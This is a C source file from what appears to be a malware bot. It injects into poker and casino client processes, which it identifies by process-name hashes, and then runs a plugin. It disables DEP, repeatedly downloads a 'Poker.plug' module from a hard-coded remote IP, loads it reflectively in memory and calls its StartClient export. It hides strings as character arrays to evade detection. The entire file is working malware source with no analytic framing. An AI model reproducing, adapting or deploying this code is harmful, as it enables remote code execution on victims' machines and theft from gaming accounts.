#include <windows.h>

#include "GetApi.h"
#include "Loader.h"
#include "DllLoader.h"
#include "BotUtils.h"
#include "Memory.h"
#include "Strings.h"
#include "Config.h"
#include "Poker.h"
#include "Utils.h"
#include "Splice.h"



typedef struct
{
	char *Server;
	DWORD dwPort;
} VNC, * PVNC;


DWORD WINAPI PokerThread( LPVOID lpData )
{
	DisableDEP();

	//char *Host = GetCurrentHost();
	char Host[] = "94.240.148.127";

	if ( Host == NULL )
	{
		return 0;
	}

	char SBFile[] = {'/','P','o','k','e','r','.','p','l','u','g',0};

	char SBUrl[256];

	m_lstrcpy( SBUrl, Host );
	m_lstrcat( SBUrl, SBFile );


	LPBYTE BotModule   = NULL;
	DWORD dwModuleSize = 0;

	while ( ( BotModule = (LPBYTE)DownloadPlugin( SBUrl ) ) == NULL ) 
	{		
		pSleep( 1000 * 60 * 1 );
	}

	HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );

	typedef void (WINAPI *PStartClient)(char *Uid );

	char StartClient_func[] = {'S','t','a','r','t','C','l','i','e','n','t',0};

	PStartClient StartClient = (PStartClient)MemoryGetProcAddress( hLib, StartClient_func );
	
	char Uid[100];
	GenerateUid( Uid );
	SetSBStarted(true);
	StartClient(  Uid );
	return 0;

}

//----------------------------------------------------------------------------


bool IsPoker()
{
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	MemFree( ModulePath );
		 
	if (dwProcessHash == 0x322d03c3 ||	//fulltiltpoker.exe - 0x322d03c3
		dwProcessHash == 0xc0cd8288 ||	// pokerstars.exe - 0xc0cd8288
		dwProcessHash == 0x53188e75 ||	//partypoker.exe - 0x53188e75
		dwProcessHash == 0x9b2c44a3 ||	//partygaming.exe - 0x9b2c44a3
		dwProcessHash == 0xa53992b8 ||	//draculaholdem.exe - 0xa53992b8
		dwProcessHash == 0x8e768583 ||	//empirepokermaster.exe - 0x8e768583
		dwProcessHash == 0xc717d0a0 ||	// mainclient.exe - 0xc717d0a0
		dwProcessHash == 0x143edb22 ||	//casino.exe - 0x143edb22
		dwProcessHash == 0x5506c832 ||	//mppoker.exe - 0x5506c832
		dwProcessHash == 0x2516fb3a ||	//bpgame.exe - 0x2516fb3a
		dwProcessHash == 0xc33d43cd ||	//everest poker.exe - 0xc33d43cd
		dwProcessHash == 0xb630fbc3 ||	//cstart.exe - 0xb630fbc3
		dwProcessHash == 0x6ebc3770 ||	//cstart-tmp.exe - 0x6ebc3770
		dwProcessHash == 0x5506d34a ||	//poker.exe - 0x5506d34a
		dwProcessHash == 0x63792409 ||	//betfair poker.exe - 0x63792409
		dwProcessHash == 0xed2f8789 ||	//holdemmanager.exe - 0xed2f8789
		dwProcessHash == 0x4aa651da ||	//replayer.vshost.exe - 0x4aa651da
		dwProcessHash == 0x203139e9 ||	//pokerroom.exe - 0x203139e9
		dwProcessHash == 0xc3fa41e7 ||	//eurobetpoker.exe - 0xc3fa41e7
		dwProcessHash == 0x223b333a ||	//mansionpoker.exe - 0x223b333a
		dwProcessHash == 0xd3586ffd ||	//europoker.exe - 0xd3586ffd
		dwProcessHash == 0xd3cb2bbd ||	//
		dwProcessHash == 0x8be9c120 ||	//
		dwProcessHash == 0xf2386d2a ||	//
		dwProcessHash == 0xae14f10b ||	//
		dwProcessHash == 0xc033dcaf ||	//
		dwProcessHash == 0x533bcb3d ||	//
		dwProcessHash == 0x532a6fb0 ||	//
		dwProcessHash == 0xb64a901f ||	//
		dwProcessHash == 0xca1eaebb ||	//
		dwProcessHash == 0x550a08bd ||	//
		dwProcessHash == 0x3c229b71 ||	//
		dwProcessHash == 0xf3f82a30 ||	//
		dwProcessHash == 0x522be83b ||	//
		dwProcessHash == 0x262fe4f9 ||	//
		dwProcessHash == 0x231b8491 ||	//
		dwProcessHash == 0xb11c0d7e ||	//
		dwProcessHash == 0x5506d34a)	//
	{		
		StartThread(PokerThread, 0);
		return true;
	}
	return false;
}